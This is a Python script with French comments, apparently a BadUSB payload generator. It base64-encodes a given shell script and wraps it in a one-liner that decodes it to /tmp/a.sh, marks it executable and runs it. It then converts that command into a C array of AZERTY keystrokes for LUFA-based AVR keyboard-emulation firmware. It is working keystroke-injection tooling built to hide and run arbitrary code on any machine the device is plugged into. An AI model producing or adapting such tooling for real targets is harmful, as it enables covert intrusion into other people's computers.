import base64
import sys
import os

def generer_tableau_c(fichier_entree):
    try:
        with open(fichier_entree, 'r', encoding='utf-8') as f:
            contenu = f.read()
    except FileNotFoundError:
        print(f"Erreur : Le fichier {fichier_entree} n'existe pas.")
        return

    # Encodage en Base64
    b64_encoded = base64.b64encode(contenu.encode('utf-8')).decode('utf-8')
    commande = f"echo '{b64_encoded}' | base64 -d > /tmp/a.sh && chmod +x /tmp/a.sh && /tmp/a.sh\n"
    # --- Extraction du nom ---
    # 1. os.path.basename('/dossier/mon_script.sh') garde juste 'mon_script.sh'
    # 2. os.path.splitext('mon_script.sh') le coupe en deux : ('mon_script', '.sh')
    # On prend la case [0] pour ne garder que le nom pur.
    nom_brut = os.path.splitext(os.path.basename(fichier_entree))[0]

    # 3. Sécurité C : on remplace les tirets et espaces par des underscores (_)
    nom_var = nom_brut.replace('-', '_').replace(' ', '_')

    # Dictionnaire de mapping basé sur tes macros complètes AZERTY (FR)
    mapping = {
        ' ': ('0', 'FR_ESPACE'),
        '\n': ('0', 'FR_ENTREE'),
        '=': ('0', 'FR_EGAL'),
        '+': ('HID_KEYBOARD_MODIFIER_LEFTSHIFT', 'FR_EGAL'),
        ',': ('0', 'FR_VIRGULE'),
        ';': ('0', 'FR_POINT_VIRGULE'),
        '.': ('HID_KEYBOARD_MODIFIER_LEFTSHIFT', 'FR_POINT_VIRGULE'),
        ':': ('0', 'FR_DEUX_POINTS'),
        '/': ('HID_KEYBOARD_MODIFIER_LEFTSHIFT', 'FR_DEUX_POINTS'),
        '!': ('0', 'FR_POINT_EXCLAMATION'),
        '<': ('0', 'FR_CHEVRON_G'),
        '>': ('HID_KEYBOARD_MODIFIER_LEFTSHIFT', 'FR_CHEVRON_G'),
        '*': ('0', 'FR_ASTERISQUE'),
        '$': ('0', 'FR_DOLLAR'),
        '-': ('0', 'FR_TIRET'),
        '_': ('0', 'FR_UNDERSCORE'),
        '|': ('HID_KEYBOARD_MODIFIER_RIGHTALT', 'FR_TIRET'),
        '\'': ('0', 'FR_APOSTROPHE'),
        '"': ('0', 'FR_GUILLEMET'),
        '&': ('0', 'FR_ESPERLUETTE'),
        '(': ('0', 'FR_PARENTHESE_G'),
        ')': ('0', 'FR_PARENTHESE_D'),
        'é': ('0', 'FR_E_ACCENT_AIGU'),
        'è': ('0', 'FR_E_ACCENT_GRAVE'),
        'ç': ('0', 'FR_C_CEDILLE'),
        'à': ('0', 'FR_A_ACCENT_GRAVE'),
        'ù': ('0', 'FR_U_ACCENT_GRAVE'),
        '^': ('0', 'FR_CIRCONFLEXE'),
        '²': ('0', 'FR_CARRE'),
    }

    # Ajout automatique des lettres a-z et A-Z
    for c in range(ord('a'), ord('z') + 1):
        lettre = chr(c)
        mapping[lettre] = ('0', f"FR_{lettre.upper()}")
        mapping[lettre.upper()] = ('HID_KEYBOARD_MODIFIER_LEFTSHIFT', f"FR_{lettre.upper()}")

    # Mapping spécifique pour les chiffres AZERTY (qui utilisent Shift)
    chiffres_azerty = {
        '1': 'FR_ESPERLUETTE',
        '2': 'FR_E_ACCENT_AIGU',
        '3': 'FR_GUILLEMET',
        '4': 'FR_APOSTROPHE',
        '5': 'FR_PARENTHESE_G',
        '6': 'FR_TIRET',
        '7': 'FR_E_ACCENT_GRAVE',
        '8': 'FR_UNDERSCORE',
        '9': 'FR_C_CEDILLE',
        '0': 'FR_A_ACCENT_GRAVE'
    }
    for chiffre, macro in chiffres_azerty.items():
        mapping[chiffre] = ('HID_KEYBOARD_MODIFIER_LEFTSHIFT', macro)

    # --- Génération du code C ---
    print("/* Fichier généré automatiquement pour LUFA C */")
    print("#include \"Dictionnaire.h\"") # On inclut ton fichier d'en-tête générique
    print("#include <avr/pgmspace.h>\n")
    
    print(f"// Payload total : {len(commande)} caractères")
    print(f"const KeyPress {nom_var}[{len(commande)}] PROGMEM = {{")

    # Conversion de la commande en tableau C
    for char in commande:
        if char in mapping:
            mod, key = mapping[char]
            print(f"    {{{mod}, {key}}}, // '{char if char != '\n' else 'ENTER'}'")
        else:
            # Fallback de sécurité si un caractère est manquant
            print(f"    {{0, 0}}, // ERREUR: Caractère '{char}' non mappé")

    print("};")
    print(f"const uint16_t {nom_var}_len = {len(commande)};")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Utilisation : python3 generateur_c.py <ton_script.sh>")
    else:
        generer_tableau_c(sys.argv[1])
